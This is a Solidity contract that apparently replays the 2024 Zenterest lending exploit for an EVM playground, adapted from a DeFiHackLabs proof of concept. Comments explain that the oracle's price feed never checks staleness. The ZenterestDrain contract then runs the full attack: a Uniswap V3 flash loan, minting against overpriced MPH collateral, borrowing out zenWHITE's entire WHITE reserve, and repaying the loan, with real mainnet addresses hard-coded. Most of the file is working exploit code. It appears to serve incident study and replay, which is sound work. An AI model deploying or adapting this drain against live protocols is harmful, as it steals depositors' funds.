// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-08-Zenterest).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (attacker == address(this); the flash-loan callback
// `uniswapV3FlashCallback` is a function on the test itself, not on a
// separate exploit contract):
//
//   vm.prank(WHALE); MPH.transfer(address(this), 23_200 ether);
//   Pool.flash(address(this), 85 ether, 0, "");
//   // Pool calls back into uniswapV3FlashCallback(...) on this contract:
//   function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
//       unitroller.enterMarkets([zenMPH]);
//       MPH.approve(zenMPH, type(uint256).max);
//       MPH.transfer(zenMPH, 2000 ether);
//       zenMPH.mint(21_200 ether);
//       uint256 bal = WHITE.balanceOf(address(this));
//       WHITE.transfer(zenWHITE, bal);
//       zenWHITE.accrueInterest();
//       uint256 borrowAmount = WHITE.balanceOf(zenWHITE);
//       zenWHITE.borrow(borrowAmount);
//       WHITE.transfer(Pool, bal + fee0);
//   }
//
// This contract is a faithful, self-contained copy of that inline attack so
// the playground can deploy it and record attack(). Logic and constants are
// copied verbatim from test/Zenterest_exp.sol. Getting the 23,200 MPH from
// the historical whale (0x9074…f15) is replicated as an UNRECORDED `setup`
// rawCall (mirrors vm.prank + transfer); everything from the flash loan
// onward is the single recorded `attack()` call, exactly like the original
// test's single `Pool.flash(...)` line triggers the whole chain synchronously.
//
// Root cause: ZenterestPriceFeed (the Comptroller's oracle) stores an
// `updatedAt` timestamp for every price but NEVER checks it on the read path
// (`assetPrices`/`getUnderlyingPrice` return the stored mantissa unconditionally,
// no staleness check). The reporter abandoned the MPH and WHITE feeds in
// January 2023; by the August 2024 attack they were ~566/~581 days stale.
// MPH's real market value had collapsed to near-zero, but the oracle still
// valued it at its frozen 2023 price, so a cheaply-acquired pile of MPH
// deposited as collateral was still credited as if it were worth real money —
// enough to justify borrowing out zenWHITE's entire real WHITE cash reserve.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

interface ICErc20Delegate {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract ZenterestDrain {
    IUniPairV3 internal constant POOL = IUniPairV3(0xC5c134A1f112efA96003f8559Dba6fAC0BA77692);
    IERC20 internal constant WHITE = IERC20(0x5F0E628B693018f639D10e4A4F59BD4d8B2B6B44);
    IERC20 internal constant MPH = IERC20(0x8888801aF4d980682e47f1A9036e589479e835C5);
    IUnitroller internal constant UNITROLLER = IUnitroller(0x606246e9EF6C70DCb6CEE42136cd06D127E2B7C7);
    ICErc20Delegate internal constant ZEN_WHITE = ICErc20Delegate(0xE3334e66634acF17B2b97ab560ec92D6861b25fa);
    ICErc20Delegate internal constant ZEN_MPH = ICErc20Delegate(0x4dD6D5D861EDcD361455b330fa28c4C9817dA687);

    /// @notice Recorded attack: flash-loan 85 WHITE, which synchronously
    ///         triggers uniswapV3FlashCallback below — mirrors the test's
    ///         single `Pool.flash(attacker, 85 ether, 0, "")` call. By this
    ///         point `setup` has already prank-transferred 23,200 MPH here.
    function attack() external {
        POOL.flash(address(this), 85 ether, 0, "");
    }

    /// @notice Uniswap V3 flash-loan callback. The pool calls this on
    ///         msg.sender (this contract) synchronously inside `flash()`.
    ///         This is where the entire exploit happens: build oracle-
    ///         overpriced MPH collateral, top up zenWHITE's borrowable cash
    ///         with the flash-loaned WHITE, borrow it all back out using the
    ///         stale-priced collateral, then repay the flash loan.
    function uniswapV3FlashCallback(uint256 fee0, uint256 /* fee1 */, bytes calldata /* data */) external {
        // Enter the zenMPH market so it counts as collateral.
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(ZEN_MPH);
        UNITROLLER.enterMarkets(cTokens);

        // Build the (oracle-overpriced) collateral position: donate 2,000 MPH
        // directly to zenMPH, then mint against 21,200 MPH.
        MPH.approve(address(ZEN_MPH), type(uint256).max);
        MPH.transfer(address(ZEN_MPH), 2000 ether);
        ZEN_MPH.mint(21_200 ether);

        // Top up zenWHITE's borrowable cash with the flash-loaned WHITE so
        // the full reserve can be pulled out in one borrow.
        uint256 whiteBal = WHITE.balanceOf(address(this));
        WHITE.transfer(address(ZEN_WHITE), whiteBal);
        ZEN_WHITE.accrueInterest();

        // The vulnerable moment: the Comptroller's solvency check uses
        // ZenterestPriceFeed's ~566/~581-day-stale MPH/WHITE prices, which
        // still value the (real-market-worthless) MPH collateral high enough
        // to approve borrowing out zenWHITE's entire cash reserve.
        uint256 borrowAmount = WHITE.balanceOf(address(ZEN_WHITE));
        ZEN_WHITE.borrow(borrowAmount);

        // Repay the flash loan (principal + fee); the remainder is profit.
        WHITE.transfer(address(POOL), whiteBal + fee0);
    }
}
